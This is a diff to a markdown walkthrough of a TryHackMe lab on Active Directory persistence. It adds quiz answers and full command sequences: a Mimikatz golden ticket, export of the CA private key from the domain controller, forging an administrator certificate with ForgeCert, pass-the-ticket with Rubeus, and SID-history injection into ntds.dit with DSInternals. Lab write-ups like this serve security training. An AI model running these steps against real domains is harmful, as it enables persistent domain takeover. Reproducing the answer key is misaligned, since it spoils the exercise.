@@ -387,7 +387,7 @@ Now we have golden and silver tickets to the AD environment, providing better pe
 	* Run Script for Golden Ticket
 		
 		```
-		kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
+		kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
 		```
 
 		![task3-silver](./images/task3-silver.png)
@@ -582,10 +582,106 @@ So what's the only solution to remove the persistence? Well, this is why we are 
 ### Answer the questions below
 
 * What key is used to sign certificates to prove their authenticity?
+	
+	`Private Key`
 
 * What application can we use to forge a certificate if we have the CA certificate and private key?
+	
+	`ForgeCert.exe`
 
 * What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?
+
+	`kerberos::ptt ticket.kirbi`
+
+	* Login SSH to THMDC
+	
+		```
+		ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc
+		```
+
+		![task4-ssh](./images/task4-ssh.png)
+
+	* Create personal directory and run mimikatz
+	
+		```
+		mkdir kakakseram
+		cd kakakseram
+		C:\Tools\mimikatz_trunk\x64\mimikatz.exe`
+		```
+
+		![task4-mimikatz](./images/task4-mimikatz.png)
+
+	* Try to view the certificates stored on the DC
+	
+		```
+		crypto::certificates /systemstore:local_machine
+		```
+
+		![task4-certificate](./images/task4-certificate.png)
+
+	* Patch memory to make these keys exportable
+	
+		```
+		privilege::debug
+		crypto::capi
+		crypto::cng
+		```
+
+		![task4-patch](./images/task4-patch.png)
+
+	* Use mimikatz to export the certificates
+	
+		```
+		crypto::certificates /systemstore:local_machine /export
+		```
+
+		![task4-export](./images/task4-export.png)
+
+	* The exported certificates will be stored in both PFX and DER format to disk
+	
+		![task4-dir](./images/task4-dir.png)
+
+	* Get the credential
+	
+		![task4-cred](./images/task4-cred.png)
+
+	* Login SSH to THMWRK1
+	
+		```
+		ssh chloe.potter@za.tryhackme.loc@thmdc.za.tryhackme.loc
+		```
+
+		![task4-ssh2](./images/task4-ssh2.png)
+
+	* Copy the certificate to THMWRK1
+	
+		```
+		scp administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc:C:/Users/Administrator/kakakseram/local_machine_My_1_za-THMDC-CA.pfx .
+		```
+
+		![task4-scp](./images/task4-scp.png)
+
+	* Generating our own certificate
+	
+		```
+		C:\Tools\ForgeCert\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
+ 		```
+
+ 		![task4-forgecert](./images/task4-forgecert.png)
+
+ 	* Use Rubeus to request a TGT using the certificate to verify that the certificate is trusted
+ 	
+ 		```
+ 		C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:ticket.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101
+ 		```
+
+ 	* Use Mimikatz to inject the ticket into our session
+ 	
+ 		```
+ 		kerberos::ptt ticket.kirbi
+ 		exit
+ 		```
+
 
 ## Task 5 - Persistence through SID History
 
@@ -670,10 +766,74 @@ Imagine that you are the blue team dealing with an incident where you have just 
 ### Answer the questions below
 
 * What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?
+	
+	`SIDHistory`
 
 * What is the database file on the domain controller that stores all AD information?
+	
+	`ntds.dit`
 
 * What is the PowerShell command to restart the ntds service after we injected our SID history values?
+
+	`Start-Service -Name ntds`
+
+	* Get the credential
+	
+		![task5-cred](./images/task5-cred.png)
+
+	* Login SSH to THMDC
+	
+		```
+		ssh louis.cole@za.tryhackme.loc@thmdc.za.tryhackme.loc
+		```
+
+		![task5-ssh](./images/task5-ssh.png)
+
+	* Use powershell to check SID history
+	
+		```
+		Get-ADUser louis.cole -Properties sidhistory
+		```
+
+		![task5-sid-history](./images/task5-sid-history.png)
+
+	* Get the SID of the Domain Admins group
+	
+		```
+		Get-ADGroup "Domain Admins"
+		```
+
+		![task5-domain-admin](./images/task5-domain-admin.png)
+
+	* Login SSH to THMDC
+	
+		```
+		ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc
+		```
+
+		![task4-ssh](./images/task4-ssh.png)
+
+	* Restart service ntds and use the DSInternals tools to directly patch the ntds.dit file
+	
+		```
+		Stop-Service -Name ntds -force
+		
+		Add-ADDBSidHistory -SamAccountName louis.cole -SidHistory S-1-5-21-3885271727-2693558621-2658995185-512 -DatabasePath C:\Windows\NTDS\ntds.dit
+		
+		Start-Service -Name ntds
+		```
+
+		![task5-restart](./images/task5-restart)
+
+	* Check SID history on user account
+	
+		```
+		Get-ADUser louis.cole -Properties sidhistory 
+
+		dir \\thmdc.za.tryhackme.loc\c$
+		```
+
+		![task5-confirm](./images/task5-confirm.png)
 
 ## Task 6 - Persistence through Group Membership
 
